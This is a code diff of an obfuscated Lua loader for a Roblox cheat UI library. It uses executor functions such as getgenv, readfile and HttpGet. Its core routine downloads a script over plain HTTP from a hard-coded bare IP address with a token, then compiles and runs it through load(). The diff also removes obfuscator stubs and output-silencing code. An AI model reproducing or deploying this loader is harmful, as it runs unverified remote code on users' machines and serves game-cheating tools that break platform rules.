@@ -2,22 +2,9 @@ repeat task.wait() until game:IsLoaded()
 
 local Library = {}
 
-if not LPH_OBFUSCATED then
-	LPH_ENCSTR = function(...) return ... end
-	LPH_JIT_MAX = function(...) return ... end
-	LPH_NO_VIRTUALIZE = function(f) return f end
-	LPH_NO_UPVALUES = function(...) return ... end
-	LPH_CRASH = function(...) return ... end
-else
-	print = function() end
-	warn = function() end
-end
-
-local HttpService = game:GetService("HttpService")
-
 local gnp5rn = {g8r7m6 = nil, horc09 = 0, rkts7j = 3, mvfpwl = 0, egdoyw = 5}
 
-local function qiey1x(ux1jvu)
+Library.qiey1x = function(ux1jvu)
 	local zv9ond = tick()
 
 	if ux1jvu ~= true and type(gnp5rn.g8r7m6) == "string" and gnp5rn.g8r7m6 ~= "" then
@@ -39,7 +26,7 @@ local function qiey1x(ux1jvu)
 	return gnp5rn.g8r7m6
 end
 
-local function dl5m3j(i8v1w3, x4dw4y)
+Library.dl5m3j = function(i8v1w3, x4dw4y)
 	x4dw4y = tonumber(x4dw4y) or 100
 
 	if type(i8v1w3) ~= "string" or #i8v1w3 < x4dw4y then return false end
@@ -49,11 +36,11 @@ local function dl5m3j(i8v1w3, x4dw4y)
 	return true
 end
 
-local function qiu83y(xfy3ka)
+Library.qiu83y = function(xfy3ka)
 	xfy3ka = tonumber(xfy3ka) or 6
 
 	for etk98o = 1, xfy3ka do
-		local g8r7m6 = qiey1x(etk98o > 1)
+		local g8r7m6 = Library.qiey1x(etk98o > 1)
 
 		if type(g8r7m6) ~= "string" or g8r7m6 == "" then
 			if etk98o < xfy3ka then task.wait(0.2) end
@@ -64,25 +51,25 @@ local function qiu83y(xfy3ka)
 			return game:HttpGet(LPH_ENCSTR("http://45.43.163.142:25576/library.luau") .. LPH_ENCSTR("?g8r7m6=") .. g8r7m6)
 		end)
 
-		if dl8dyc and dl5m3j(lco65o, 2000) then
+		if dl8dyc and Library.dl5m3j(lco65o, 2000) then
 			gnp5rn.mvfpwl += 1
 
 			return lco65o
 		end
 
-		if etk98o < xfy3ka then 
-			task.wait(0.2) 
+		if etk98o < xfy3ka then
+			task.wait(0.2)
 		end
 	end
 	return nil
 end
 
-local function iybfe4(dvc65z)
-	if type(dvc65z) ~= "string" or not dl5m3j(dvc65z, 2000) then
-		dvc65z = qiu83y(6)
+Library.iybfe4 = function(dvc65z)
+	if type(dvc65z) ~= "string" or not Library.dl5m3j(dvc65z, 2000) then
+		dvc65z = Library.qiu83y(6)
 	end
 
-	if not dl5m3j(dvc65z, 2000) then 
+	if not Library.dl5m3j(dvc65z, 2000) then
 		return nil
 	end
 
@@ -91,19 +78,19 @@ local function iybfe4(dvc65z)
 	if type(dbmhlz) ~= "function" and load then
 		local azqhqy, k6rgd6 = pcall(load, dvc65z)
 
-		if azqhqy and type(k6rgd6) == "function" then 
+		if azqhqy and type(k6rgd6) == "function" then
 			dbmhlz = k6rgd6
 		end
 	end
 
-	if type(dbmhlz) ~= "function" then 
+	if type(dbmhlz) ~= "function" then
 		return nil
 	end
 
 	local hg3qtg = pcall(dbmhlz)
 
-	if not hg3qtg then 
-		return nil 
+	if not hg3qtg then
+		return nil
 	end
 
 	if type(getgenv().Library) == "table" and type(getgenv().Library.Window) == "function" then
@@ -113,21 +100,21 @@ local function iybfe4(dvc65z)
 	return nil
 end
 
-local function v96s52()
+Library.v96s52 = function()
 	if type(readfile) == "function" then
 		for _, c5lc0b in {"solixrivalsUI.luau", "library.luau"} do
 			local d8i3ym, rnjbuw = pcall(readfile, c5lc0b)
 
-			if d8i3ym and dl5m3j(rnjbuw, 2000) then
-				local uf3od3 = iybfe4(rnjbuw)
+			if d8i3ym and Library.dl5m3j(rnjbuw, 2000) then
+				local uf3od3 = Library.iybfe4(rnjbuw)
 
 				if type(uf3od3) == "table" then
-					return uf3od3 
+					return uf3od3
 				end
 			end
 		end
 	end
-	return iybfe4(nil)
+	return Library.iybfe4(nil)
 end
 
 local ip12q2 = getgenv().Library
@@ -136,5 +123,7 @@ if type(ip12q2) == "table" and type(ip12q2.Unload) == "function" then
 	pcall(ip12q2.Unload, ip12q2)
 end
 
-getgenv().Library = v96s52()
-return getgenv().Library
+local Load = Library.v96s52()
+
+getgenv().Library = Load
+return Load
